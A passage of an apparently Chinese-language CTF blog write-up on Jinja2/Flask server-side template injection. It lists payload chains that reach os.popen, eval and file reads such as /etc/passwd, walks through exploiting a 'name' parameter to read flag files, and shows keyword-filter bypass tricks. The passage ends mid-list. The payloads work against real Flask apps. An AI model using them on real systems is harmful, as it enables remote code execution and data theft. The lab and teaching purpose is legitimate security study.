+format(value,arags,*kwargs)    格式化字符串。比如：&#123;&#123;"%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!
+
+length()    返回一个序列或者字典的长度；
+
+sum()        返回列表内数值的和；
+
+sort()        返回排序后的列表；
+
+default(value,default_value,boolean=false)    如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
+
+length()    返回字符串的长度，别名是count
+</code></pre>
+<p><strong>利用链</strong></p>
+<p>python2、python3 通用 payload（因为每个环境使用的python库不同 所以类的排序有差异）</p>
+<p>直接使用 popen（python2不行）</p>
+<pre><code>os._wrap_close 类里有popen
+
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()
+</code></pre>
+<p>使用 os 下的 popen</p>
+<pre><code>含有 os 的基类都可以，如 linecache
+
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()
+</code></pre>
+<p>使用<code>__import__</code>下的os（python2不行）</p>
+<pre><code>可以使用 __import__ 的 os
+
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()
+</code></pre>
+<p><code>__builtins__</code>下的多个函数</p>
+<pre><code>__builtins__下有eval，__import__等的函数，可以利用此来执行命令
+
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()
+</code></pre>
+<p>利用 python2 的 file 类读取文件</p>
+<pre><code>在 python3 中 file 类被删除
+
+# 读文件
+[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()
+[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()
+# 写文件
+&quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)
+# python2的str类型不直接从属于属于基类，所以要两次 .__bases__
+</code></pre>
+<p>flask内置函数</p>
+<pre><code>Flask内置函数和内置对象可以通过&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）
+
+&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;
+#查看内置函数
+#函数：lipsum、url_for、get_flashed_messages
+#类：cycler、joiner、namespace、config、request、session
+&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;
+#函数
+&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;
+#类
+如果要查config但是过滤了config直接用self.__dict__就能找到里面的config
+</code></pre>
+<p>通用 getshell</p>
+<pre><code>原理就是找到含有 __builtins__ 的类，然后利用
+
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+#读写文件
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><pre><code>1.随便找一个内置类对象用__class__拿到他所对应的类
+2.用__bases__拿到基类（&lt;class &#39;object&#39;&gt;）
+3.用__subclasses__()拿到子类列表
+4.在子类列表中直接寻找可以利用的类getshell
+
+对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
+</code></pre>
+<h2 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h2><pre><code>关于python魔术方法payload：&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() 的解释  
+# 获得一个字符串实例
+&gt;&gt;&gt; &quot;&quot;
+&#39;&#39;
+
+# 获得字符串的type实例
+&gt;&gt;&gt; &quot;&quot;.__class__ 
+&lt;type &#39;str&#39;&gt;
+
+# 获得其父类
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
+
+# 获得父类中的object类
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2] 
+&lt;type &#39;object&#39;&gt;
+
+# 获得object类的子类，但发现这个__subclasses__属性是个方法
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__
+&lt;built-in method __subclasses__ of type object at 0x10376d320&gt;
+
+# 使用__subclasses__()方法，获得object类的子类
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__() 
+[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]
+
+# 获得第40个子类的一个实例，即一个file实例
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40] mappingproxy
+&lt;type &#39;file&#39;&gt;
+
+# 对file初始化
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;) 
+&lt;open file &#39;/etc/passwd&#39;, mode &#39;r&#39; at 0x10397a8a0&gt;
+
+# 使用file的read属性读取，但发现是个方法
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read
+&lt;built-in method read of file object at 0x10397a5d0&gt;
+
+# 使用read()方法读取
+&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read()
+nobody:*:-2:-2:Unprivileged 
+User:/var/empty:/usr/bin/false
+root:*:0:0:System 
+Administrator:/var/root:/bin/sh
+</code></pre>
+<p>[关于python魔术方法payload：&quot;&quot;.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read() 的解释]: <a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/</a></p>
+<p>写一个python脚本带入执行查找flag</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数
+    &#123;% if 'eval' in b.keys() %&#125;    //找到了
+      &#123;&#123; b['eval']('__import__("os").popen("ls").read()') &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+ 
+ 
+//然后cat 就可以
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("cat /tmp/ddddd/2222/flag ").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+//我们可以改里面的命令
+</code></pre>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参数呢???</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281906623.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328190651574"></p>
+
+<p>小小fuzz一下</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281917579.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328191752524"></p>
+
+<p>找到个name参数,发现一个xss</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281919739.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328191917686"></p>
+
+<p>不玩了,测试一下ssti</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281920069.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192003008"></p>
+
+<p>发现存在模板注入</p>
+<pre><code>获得字符串的type实例
+?name=&#123;&#123;"".__class__&#125;&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281921506.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192137444"></p>
+
+<pre><code>获得其父类
+?name=&#123;&#123;"".__class__.__mro__&#125;&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281922424.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192221359"></p>
+
+<pre><code>获得父类中的object类
+?name=&#123;&#123;"".__class__.__mro__[1]&#125;&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281924934.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192427878"></p>
+
+<pre><code>获得object类的子类，但发现这个__subclasses__属性是个方法
+?name=&#123;&#123;"".__class__.__mro__[1].__subclasses__&#125;&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281925083.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192545009"></p>
+
+<pre><code>使用__subclasses__()方法，获得object类的子类
+?name=&#123;&#123;"".__class__.__mro__[1].__subclasses__()&#125;&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281926393.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328192626252"></p>
+
+<pre><code>提供 os._wrap_close 中的 popen 函数
+?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;
+# 这种方法的缺点在于需要找到 类 的索引
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281930568.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328193058507"></p>
+
+<p>来个脚本</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数
+    &#123;% if 'eval' in b.keys() %&#125;    //找到了
+      &#123;&#123; b['eval']('__import__("os").popen("ls").read()') &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+ 
+ 
+//然后cat 就可以
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("cat /tmp/ddddd/2222/flag ").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+//我们可以改里面的命令
+</code></pre>
+<p>用的时候可以把注释去掉</p>
+<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         
+    &#123;% if 'eval' in b.keys() %&#125;    
+      &#123;&#123; b['eval']('__import__("os").popen("ls /").read()') &#125;&#125; 
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281936748.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328193657700"></p>
+
+<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;   
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         
+    &#123;% if 'eval' in b.keys() %&#125;    
+      &#123;&#123; b['eval']('__import__("os").popen("cat /flag").read()') &#125;&#125; 
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281937923.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220328193722883"></p>
+
+<p>另外的方法</p>
+<p>也可以直接用 <strong>lipsum</strong> 和 cycler 执行命令</p>
+<pre><code>?name=&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;
+?name=&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;
+</code></pre>
+<p>或者用控制块去直接执行命令</p>
+<pre><code>?name=&#123;% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat ../flag').read()"))%&#125;
+</code></pre>
+<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><h2 id="ssti模板注入绕过"><a href="#ssti模板注入绕过" class="headerlink" title="ssti模板注入绕过"></a>ssti模板注入绕过</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
+<li><code>&#123;%%&#125;</code>可以用来声明变量,当然也可以用于循环语句和条件语句</li>
+<li><code>&#123;undefined&#123;&#125;&#125;</code>用于将表达式打印到模板输出</li>
+<li>&#96;&#96;表示未包含在模板输出中的注释</li>
+<li>##可以有和<code>&#123;%%&#125;</code>相同的效果</li>
+</ul>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>除了使用标准的python .(点)之外,还可以使用中括号来访问变量的属性.</p>
+<pre><code>&#123;&#123;"".__class__&#125;&#125;
+&#123;&#123;""['__class__']&#125;&#125;
+</code></pre>
+<p>所以过滤了. 我们还可以使用中括号绕过个.如果想调用字典中的键值,其实本质上是调用了魔术方法__getitem__ 所以对于取字典中键值的情况不仅可以使用[],也可以使用__getitm__,当然对于字典来说,我们也可以用他自带的一些方法了.pop就是其中的一个</p>
+<pre><code>pop(key[,default])
+参数
+key: 要删除的键值
+default: 如果没有 key，返回 default 值
+删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。
+</code></pre>
+<p>那么调用对象的方法具体是什么原理呢,其实他调用了魔术方法_<em>getattribute</em>_</p>
+<pre><code>&quot;&quot;.__class__
+&quot;&quot;.__getattribute__(&quot;__class__&quot;)
+</code></pre>
+<p>如果题目过滤了class或者一些关键字,我们就可以通过字符串处理进行拼接了</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol>
+<li><p>拼接</p>
+<pre><code>&quot;cla&quot;+&quot;ss&quot;
+</code></pre>
+</li>
+<li><p>反转</p>
+<pre><code>&quot;__ssalc__&quot;[::-1]
+</code></pre>
+<p> 在jinjia2里面,”cla””ss”是等同于”class”的</p>
+<pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
+&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
+&quot;&quot;[&quot;__ssalc__&quot;][::-1]
+&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])
+</code></pre>
+</li>
+<li><p>ascii转换</p>
+<pre><code>&quot;&#123;0:c&#125;&quot;.format(97)=&#39;a&#39;
+&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#39;__class__&#39;
+</code></pre>
+</li>
+<li><p>编码绕过</p>
+<pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
+对于python2的话，还可以利用base64进行绕过
+&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)
+</code></pre>
+</li>
+<li><p>利用chr函数</p>
+<p> 我们没有办法直接使用chr函数,因此需要通过__builtins__找到它</p>
+<pre><code>&#123;% set chr=url_for.__globals__['__builtins__'].chr %&#125;
+&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;
+</code></pre>
+</li>
+<li><p>在jinja2里面可以利用~进行拼接</p>
+<pre><code>&#123;%set a='__cla' %&#125;&#123;%set b='ss__'%&#125;&#123;&#123;""[a~b]&#125;&#125;
+</code></pre>
+</li>
+<li><p>大小写转换</p>
+<pre><code>&quot;&quot;[&quot;__CLASS__&quot;.lower()]
